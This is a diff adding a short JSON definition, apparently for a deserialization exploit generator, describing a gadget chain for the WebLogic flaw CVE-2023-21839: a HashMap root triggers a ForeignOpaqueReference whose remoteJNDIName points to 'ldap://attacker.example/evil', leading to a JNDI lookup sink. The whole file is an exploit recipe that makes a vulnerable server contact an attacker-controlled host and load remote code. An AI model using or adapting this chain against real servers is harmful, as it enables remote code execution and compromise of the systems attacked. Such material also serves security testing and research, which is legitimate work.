@@ -1,0 +1,19 @@
+{
+  "chain_type": "direct_chain",
+  "description": "WebLogic ForeignOpaqueReference: OpaqueReference.getReferent() -> JNDI lookup (CVE-2023-21839)",
+  "root_class": "java.util.HashMap",
+  "root_trigger": "readObject\u2192hash\u2192hashCode",
+  "links": [
+    {
+      "class": "weblogic.jndi.internal.ForeignOpaqueReference",
+      "role": "sink",
+      "field_overrides": {
+        "remoteJNDIName": "ldap://attacker.example/evil",
+        "jndiEnvironment": {
+          "java.naming.factory.initial": "com.sun.jndi.rmi.registry.RegistryContextFactory"
+        }
+      }
+    }
+  ],
+  "sink_method": "InitialContext.lookup"
+}
